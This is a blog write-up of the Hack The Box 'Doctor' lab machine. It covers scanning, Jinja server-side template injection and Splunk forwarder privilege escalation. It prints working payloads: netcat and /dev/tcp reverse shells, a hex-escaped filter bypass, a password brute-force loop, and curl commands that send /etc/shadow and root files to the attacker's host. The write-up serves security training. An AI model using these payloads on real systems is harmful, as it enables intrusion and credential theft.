<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Doctor :: Research blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Doctor  Perform NMAP scan on IP address  root@kali:~/Downloads/hackthebox/doctor# cat nmap.txt # Nmap 7.80 scan initiated Tue Nov 10 12:20:42 2020 as: nmap -Pn -sV -p- -oN nmap.txt 10.10.10.209 Nmap scan report for 10.10.10.209 Host is up (0.11s latency). Not shown: 65532 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) 8089/tcp open ssl/http Splunkd httpd Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   Looks like its running a web server on port 80" />
<meta name="keywords" content="" />
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://thomas-byrne.co.uk/hackthebox/doctor/" />




<link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/style.css">

  <link rel="stylesheet" href="https://thomas-byrne.co.uk/assets/green.css">






<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://thomas-byrne.co.uk/img/apple-touch-icon-144-precomposed.png">

  <link rel="shortcut icon" href="https://thomas-byrne.co.uk/img/favicon/green.png">



<meta name="twitter:card" content="summary" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Doctor :: Research blog">
<meta property="og:description" content="Hack The Box machine" />
<meta property="og:url" content="https://thomas-byrne.co.uk/hackthebox/doctor/" />
<meta property="og:site_name" content="Doctor" />

  <meta property="og:image" content="https://thomas-byrne.co.uk">

<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">


  <meta property="article:published_time" content="2022-07-09 00:00:00 &#43;0000 UTC" />












</head>
<body class="green">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    /home
  </div>
</a>

    </div>
    <div class="menu-trigger">menu</div>
  </div>
  
    <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/hackthebox">HackTheBox</a></li>
        
      
      
        <ul class="menu__sub-inner">
          <li class="menu__sub-inner-more-trigger">Show more â–¾</li>

          <ul class="menu__sub-inner-more hidden">
            
              
                <li><a href="/oscp">OSCP</a></li>
              
            
              
                <li><a href="/projects">Projects</a></li>
              
            
              
                <li><a href="/research">Research</a></li>
              
            
              
                <li><a href="/showcase">Showcase</a></li>
              
            
          </ul>
        </ul>
      
    

    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/hackthebox">HackTheBox</a></li>
      
    
      
        <li><a href="/oscp">OSCP</a></li>
      
    
      
        <li><a href="/projects">Projects</a></li>
      
    
      
        <li><a href="/research">Research</a></li>
      
    
      
        <li><a href="/showcase">Showcase</a></li>
      
    
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<div class="post">
  <h1 class="post-title">
    <a href="https://thomas-byrne.co.uk/hackthebox/doctor/">Doctor</a></h1>
  <div class="post-meta">
    
      <span class="post-date">
        2022-07-09 
      </span>
    
    
    <span class="post-author">:: Tom</span>
    
  </div>

  

  
    <img src="https://thomas-byrne.co.uk" class="post-cover" alt="Doctor" />
  

  

  <div class="post-content"><div>
        <h1 id="doctor">Doctor<a href="#doctor" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
<ul>
<li>Perform NMAP scan on IP address</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Downloads/hackthebox/doctor# cat nmap.txt 
<span style="color:#75715e"># Nmap 7.80 scan initiated Tue Nov 10 12:20:42 2020 as: nmap -Pn -sV -p- -oN nmap.txt 10.10.10.209</span>
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.209
Host is up <span style="color:#f92672">(</span>0.11s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65532</span> filtered ports
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
80/tcp   open  http     Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
8089/tcp open  ssl/http Splunkd httpd
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

</code></pre></div><ul>
<li>
<p>Looks like its running a web server on port 80</p>
<ul>
<li>Apache version looks up to date (no exploit here) but might be something of interest in web page</li>
</ul>
</li>
<li>
<p>Searchsploit reveals authenticate splunk RCE</p>
</li>
</ul>
<blockquote>
<p>Splunk RCE requires creds if not using default creds</p>
</blockquote>
<ul>
<li>SSH looks up to date (nothing here)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@kali:~/Downloads/hackthebox/doctor# searchsploit  splunk
----------------------------------------------------- ---------------------------------
 Exploit Title                                       |  Path
----------------------------------------------------- ---------------------------------
Splunk - Remote Command Execution                    | multiple/remote/18245.py
Splunk 4.1.6 - <span style="color:#e6db74">&#39;segment&#39;</span> Cross-Site Scripting        | multiple/remote/36246.txt
Splunk 4.1.6 Web Component - Remote Denial of Servic | multiple/dos/36247.txt
Splunk 4.3.1 - Denial of Service                     | multiple/dos/38038.txt
Splunk 4.3.3 - Arbitrary File Read                   | multiple/webapps/21053.txt
Splunk 5.0 - Custom App Remote Code Execution <span style="color:#f92672">(</span>Metas | multiple/remote/23224.rb
Splunk 6.1.1 - <span style="color:#e6db74">&#39;Referer&#39;</span> Header Cross-Site Scripting | php/webapps/40997.txt
Splunk &lt; 7.0.1 - Information Disclosure              | linux/webapps/44865.txt
Splunk Enterprise - Information Disclosure           | multiple/webapps/41779.txt
Splunk Enterprise 6.4.3 - Server-Side Request Forger | multiple/webapps/40895.py
Splunk Enterprise 7.2.3 - <span style="color:#f92672">(</span>Authenticated<span style="color:#f92672">)</span> Custom App | windows/webapps/46238.py
Splunk Enterprise 7.2.4 - Custom App Remote Command  | windows/webapps/46487.py
----------------------------------------------------- ---------------------------------
Shellcodes: No Results


</code></pre></div><h2 id="notes">Notes<a href="#notes" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<ul>
<li>Running splunk Universal Forwarder on port 8089</li>
<li>By default remote authentication with default credentials is not allowed</li>
</ul>
<blockquote>
<p>however, if the username or password is changed and we know it then we can authenticate remotely</p>
</blockquote>
<ul>
<li>
<p>Write custom bash script to essentially bruteforce executing the payload iterating the password each time untill the correct password is found.</p>
</li>
<li>
<p>Write custom shell script to find creds for RCE</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>
username<span style="color:#f92672">=</span>Admin

<span style="color:#75715e">#------------Handles Flag Arguments--------</span>
<span style="color:#66d9ef">while</span> getopts w:s:h:p:l: flag
<span style="color:#66d9ef">do</span>
    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>flag<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> in
        w<span style="color:#f92672">)</span> wordlist<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>OPTARG<span style="color:#e6db74">}</span>;;
        s<span style="color:#f92672">)</span> script<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>OPTARG<span style="color:#e6db74">}</span>;;
        p<span style="color:#f92672">)</span> port<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>OPTARG<span style="color:#e6db74">}</span>;;
        h<span style="color:#f92672">)</span> host<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>OPTARG<span style="color:#e6db74">}</span>;;
        l<span style="color:#f92672">)</span> localhost<span style="color:#f92672">=</span><span style="color:#e6db74">${</span>OPTARG<span style="color:#e6db74">}</span>;;
        <span style="color:#75715e">#h) help=${OPTARG};;</span>
    <span style="color:#66d9ef">esac</span>
<span style="color:#66d9ef">done</span>


<span style="color:#75715e">#------------Check for arguments----------</span>
<span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$#<span style="color:#e6db74">&#34;</span> -lt <span style="color:#ae81ff">5</span> <span style="color:#f92672">]</span>
  <span style="color:#66d9ef">then</span>
    echo <span style="color:#e6db74">&#34;
</span><span style="color:#e6db74">                                    [-p Port]
</span><span style="color:#e6db74">                                    [-l Local host]
</span><span style="color:#e6db74">                                    [-h Remote host]
</span><span style="color:#e6db74">                                    [-s Script]
</span><span style="color:#e6db74">                                    [-w Password List]&#34;</span>
<span style="color:#66d9ef">fi</span>

<span style="color:#75715e">#------------Read Word List-----------------</span>
<span style="color:#66d9ef">while</span> read line;
<span style="color:#66d9ef">do</span>
        <span style="color:#75715e">#echo &#34;Trying Username:$username Password:$line&#34;</span>
        python $script --host $host --port $port --username $username --password $line --lhost $localhost --payload <span style="color:#e6db74">&#39;curl -F &#34;data=@/etc/shadow&#34; http://LocalIP:Port&#39;</span>                                                
                                                                                                             
<span style="color:#66d9ef">done</span> &lt; $wordlist

</code></pre></div><ul>
<li>This script didn&rsquo;t work</li>
<li>Webpage shows an email addres <a href="mailto:info@doctors.htb">info@doctors.htb</a></li>
</ul>
<blockquote>
<p>This gives us a domain we can point to
Update /etc/hosts to point to domain</p>
</blockquote>
<ul>
<li>Brings us to a login page
<ul>
<li>We can register an account and post messages</li>
<li>Potentially SQL injection or XSS?</li>
</ul>
</li>
<li>Found a /archive page with dirbuster</li>
<li>tried some simple template injection oayloads &ldquo;{7*7}&rdquo;</li>
</ul>
<blockquote>
<p>returned 49 in /archive source code -  this tells me it is executing code
fuzzing allows me to figure out this is jinja and not Smarty etc</p>
</blockquote>
<h2 id="jina-template-injection">Jina Template Injection<a href="#jina-template-injection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<ul>
<li>Inject command into title of message
<ul>
<li>View source of archive page <a href="http://doctors.htb/archive">http://doctors.htb/archive</a> and code will have been executed</li>
</ul>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{{<span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">application</span>.<span style="color:#a6e22e">__globals__</span>.<span style="color:#a6e22e">__builtins__</span>.<span style="color:#a6e22e">__import__</span>(<span style="color:#e6db74">&#39;os&#39;</span>).<span style="color:#a6e22e">popen</span>(<span style="color:#e6db74">&#39;nc -e /bin/bash 10.10.14.162 1234&#39;</span>).<span style="color:#a6e22e">read</span>()}}
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{{<span style="color:#a6e22e">_self</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">registerUndefinedFilterCallback</span>(<span style="color:#e6db74">&#34;exec&#34;</span>)}}{{<span style="color:#a6e22e">_self</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">getFilter</span>(<span style="color:#e6db74">&#34;id&#34;</span>)}}
</code></pre></div><ul>
<li>tried these but they didn&rsquo;t work</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">evil</span> <span style="color:#a6e22e">config</span>
{{ <span style="color:#e6db74">&#39;&#39;</span>.<span style="color:#a6e22e">__class__</span>.<span style="color:#a6e22e">__mro__</span>[<span style="color:#ae81ff">2</span>].<span style="color:#a6e22e">__subclasses__</span>()[<span style="color:#ae81ff">40</span>](<span style="color:#e6db74">&#39;/tmp/evilconfig.cfg&#39;</span>, <span style="color:#e6db74">&#39;w&#39;</span>).<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#39;from subprocess import check_output\n\nRUNCMD = check_output\n&#39;</span>) }} 
<span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">load</span> <span style="color:#a6e22e">the</span> <span style="color:#a6e22e">evil</span> <span style="color:#a6e22e">config</span>
{{ <span style="color:#a6e22e">config</span>.<span style="color:#a6e22e">from_pyfile</span>(<span style="color:#e6db74">&#39;/tmp/evilconfig.cfg&#39;</span>) }}  
<span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#a6e22e">connect</span> <span style="color:#a6e22e">to</span> <span style="color:#a6e22e">evil</span> <span style="color:#a6e22e">host</span>
{{ <span style="color:#a6e22e">config</span>[<span style="color:#e6db74">&#39;RUNCMD&#39;</span>](<span style="color:#e6db74">&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.162/1234 0&gt;&amp;1&#34;&#39;</span>,<span style="color:#a6e22e">shell</span><span style="color:#f92672">=</span><span style="color:#a6e22e">True</span>) }}

</code></pre></div><ul>
<li>
<p>This might have worked but this filter stopped it</p>
</li>
<li>
<p>Needed to bypass blacklist filter of <code>&quot;/ | . _ '</code></p>
</li>
</ul>
<blockquote>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md</a></p>
</blockquote>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{{<span style="color:#a6e22e">request</span><span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;application&#39;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;\x5f\x5fglobals\x5f\x5f&#39;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;\x5f\x5fgetitem\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;\x5f\x5fbuiltins\x5f\x5f&#39;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;\x5f\x5fgetitem\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;\x5f\x5fimport\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;popen&#39;</span>)(<span style="color:#e6db74">&#39;id&#39;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;read&#39;</span>)()}}
</code></pre></div><ul>
<li>This command worked</li>
<li>After some enumeration i found multiple versions of nc to get reverse shell
<ul>
<li>Usual nc did not work but found nc.openbsd</li>
</ul>
</li>
</ul>
<blockquote>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ncat">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#ncat</a></p>
</blockquote>
<ul>
<li>Found payload to get reverse shell with openbsd of nc</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">{{<span style="color:#a6e22e">request</span><span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;application&#39;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;\x5f\x5fglobals\x5f\x5f&#39;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;\x5f\x5fgetitem\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;\x5f\x5fbuiltins\x5f\x5f&#39;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;\x5f\x5fgetitem\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;\x5f\x5fimport\x5f\x5f&#39;</span>)(<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;popen&#39;</span>)(<span style="color:#e6db74">&#39;/usr/bin/nc.openbsd rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.98 1234 &gt;/tmp/f&#39;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#39;read&#39;</span>)()}}

</code></pre></div><ul>
<li>Got reverse shell from paylaod</li>
<li>Ran Linpeas and linux exploit suggester which did not return anything for priviledge escalation tactics</li>
<li>sudo -L returned nothing</li>
<li>Knew i needed creds for splunk RCE</li>
</ul>
<blockquote>
<p>enumeration found a backup file which is not normally found in apache2 directory - a quick grep of the file found a juicy password</p>
</blockquote>
<ul>
<li>Using su i switched to the Shaun user to test the password i found which worked!!</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat /var/log/apache2/backup | grep password


10.10.14.4 - - <span style="color:#f92672">[</span>05/Sep/2020:11:17:34 +2000<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;POST /reset_password?email=Guitar123&#34;</span> <span style="color:#ae81ff">500</span> <span style="color:#ae81ff">453</span> <span style="color:#e6db74">&#34;http://doctor.htb/reset_password&#34;</span>

</code></pre></div><ul>
<li>Splunk RCE for priviledge escalation</li>
<li>Splunk is running at root so can access /root directory</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port <span style="color:#ae81ff">8089</span> --lhost 10.10.15.26  --username shaun --password Guitar123 --payload <span style="color:#e6db74">&#34;curl -F &#39;data=@/root/root.txt&#39; http://10.10.15.26:1234&#34;</span>


</code></pre></div>
      </div></div>

  

  

</div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>Â© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
    
        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
      </div>
  </div>
</footer>

<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>





  
</div>

</body>
</html>
